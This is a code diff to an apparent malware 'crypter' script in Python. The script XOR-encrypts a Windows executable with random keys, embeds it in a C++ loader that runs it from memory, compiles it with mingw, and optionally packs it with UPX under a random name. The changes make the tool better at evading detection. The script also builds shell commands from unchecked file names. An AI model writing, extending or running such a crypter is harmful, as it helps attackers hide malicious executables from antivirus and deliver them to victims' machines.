@@ -11,19 +11,25 @@ FILETYPE    = None
 PE_IMAGE    = None
 OUT_NAME    = None
 CRYPTKEY    = None
-BINASRAW    = None
+BINASRAW    = False
+NULLBKEY    = None
+UPXPACK     = False
 
 def gen_rand_filename():
-    OUT_NAME = ""
+    name = ""
     for i in range(1, 10):
-        OUT_NAME += random.choice(list(string.ascii_uppercase + string.ascii_lowercase))
-    return
+        name += random.choice(list(string.ascii_uppercase + string.ascii_lowercase))
+    return name
 
 def gen_rand_key():
-    global CRYPTKEY
-    #CRYPTKEY = random.randint(100, 9999)
-    CRYPTKEY = 0x4b
-    #print(f"\n[+] Using key {hex(CRYPTKEY)}")
+    global CRYPTKEY, NULLBKEY
+    CRYPTKEY = random.randint(100, 999)
+    print(f"[+] Using key {hex(CRYPTKEY)}")
+
+def gen_null_key():
+    global NULLBKEY
+    NULLBKEY = random.randint(17, 50)
+    print(f"[+] Using null key {hex(NULLBKEY)}")
 
 def get_file_as_hex(infile):
     bytes = ""
@@ -34,7 +40,7 @@ def get_file_as_hex(infile):
     for num, byte in enumerate(data):
         byte = hex(byte)
         if byte == hex(0x00):
-            byte = 0x3a11739dafdda332
+            byte = hex(NULLBKEY)
         else:
             byte = hex(int(byte, 16) ^ CRYPTKEY)
             if len(str(byte)) == 3:
@@ -64,16 +70,17 @@ def write_pe_image():
 
 def write_header_file():
     with open("lib/main.h", "w") as file:
-        #HEADFILE =  f"#define key {hex(CRYPTKEY)}\n"
-        HEADFILE = "void RunFromMemory(char* pImage, char* pPath);"
+        HEADFILE =  f"#define key {hex(CRYPTKEY)}\n"
+        HEADFILE +=  f"#define null_key {hex(NULLBKEY)}\n"
+        HEADFILE += "void RunFromMemory(char* pImage, char* pPath);"
         file.write(HEADFILE)
 
 def compile():
     global OUT_NAME
-    os.popen(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/main.cpp -o {OUT_NAME} -static")
+    os.system(f"i686-w64-mingw32-g++ lib/exec_memory.cpp lib/main.cpp -o {OUT_NAME} -static")
 
 def strip_bin(infile):
-    os.system(f"strip {infile}")
+    os.system(f"strip {infile} > /dev/null")
     return get_size(infile)
 
 def get_size(filename):
@@ -81,10 +88,20 @@ def get_size(filename):
         length = len(file.read())
         return length
 
+def pack_with_upx(file):
+    name = gen_rand_filename() + ".exe"
+    os.system(f"upx {file} -o {name} > /dev/null")
+    print(f"[+] Packed {file} with upx, stored it in {name}")
+    return name
+
 def crypt(infile):
     print(f"[+] Starting to crypt {infile} ({get_size(infile)} bytes)")
-    length = strip_bin(infile)
-    print(f"[+] Stripped it down to {length} bytes")
+    if UPXPACK:
+        infile = pack_with_upx(infile)
+    else:
+        length = strip_bin(infile)
+        print(f"[+] Stripped {infile} down to {length} bytes")
+    gen_null_key()
     hex_bytes, bytes_len = get_file_as_hex(infile)
     prepare_pe_image(bytes_len, hex_bytes)
     write_pe_image()
@@ -115,19 +132,19 @@ if __name__ == '__main__':
         if args['source'] is not None: FILETYPE = 'source'
 
     if args['outfile'] is None:
-        gen_rand_filename()
+        OUT_NAME = gen_rand_filename()
     else:
         OUT_NAME = args['outfile']
 
     if args['key'] is not None:
         CRYPTKEY = hex(args['key'])
     else:
-        CRYPTKEY = 0x8274058120583047
-        #gen_rand_key()
+        gen_rand_key()
 
     if args['raw'] is not None:
         BINASRAW = True
-    else:
-        BINASRAW = False
+
+    if args['upx'] is not None:
+        UPXPACK = True
 
     crypt(args['file'])
